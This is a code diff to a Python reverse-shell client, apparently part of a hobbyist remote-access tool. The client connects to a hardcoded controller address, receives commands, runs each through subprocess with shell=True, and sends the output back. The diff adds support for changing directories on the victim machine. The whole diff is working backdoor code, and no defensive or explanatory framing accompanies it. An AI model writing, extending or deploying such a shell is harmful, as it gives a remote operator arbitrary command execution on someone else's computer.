@@ -4,6 +4,7 @@ import socket
 import subprocess
 import json
 from sys import exit
+import os
 
 
 HOST = '192.168.0.94'
@@ -28,15 +29,20 @@ def reliable_recv(_s):
 
 def shell(_s):
 	while True:
-		command = reliable_recv(_s)
-		if command == 'q':
+		cmd = reliable_recv(_s)
+		if cmd == 'q':
 			print('[-] Instruction to close sent from the server')
 			# print(colored('[-] Instruction to close sent from the server', 'red'))
 			_s.close()
 			exit(1)
 			break
+		elif cmd[:2] == 'cd' and len(cmd[3:]) > 1:
+			try:
+				os.chdir(cmd[3:])
+			except:
+				continue
 		else:
-			proc = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE,
+			proc = subprocess.Popen(cmd, shell=True, stdout=subprocess.PIPE,
 									stderr=subprocess.PIPE, stdin=subprocess.PIPE)
 			result = proc.stdout.read() + proc.stderr.read()
 			reliable_send(_s, result)
